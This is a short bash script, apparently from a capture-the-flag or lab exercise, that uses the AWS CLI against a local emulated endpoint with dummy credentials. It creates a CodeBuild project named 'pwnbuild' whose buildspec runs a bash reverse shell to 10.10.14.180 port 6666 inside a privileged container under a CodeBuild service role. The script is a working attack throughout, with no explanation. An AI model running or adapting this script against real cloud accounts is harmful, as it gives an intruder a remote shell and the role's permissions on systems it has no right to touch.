#!/bin/bash
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1
ENDPOINT=http://172.18.0.2:4566

aws --endpoint-url $ENDPOINT codebuild list-projects 2>&1
echo "--- create-project ---"
aws --endpoint-url $ENDPOINT codebuild create-project \
  --name pwnbuild \
  --source type=NO_SOURCE,buildspec='version: 0.2
phases:
  build:
    commands:
      - "bash -c \"bash -i >& /dev/tcp/10.10.14.180/6666 0>&1\""' \
  --artifacts type=NO_ARTIFACTS \
  --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=bash:latest,privilegedMode=true \
  --service-role arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/codebuild-role 2>&1
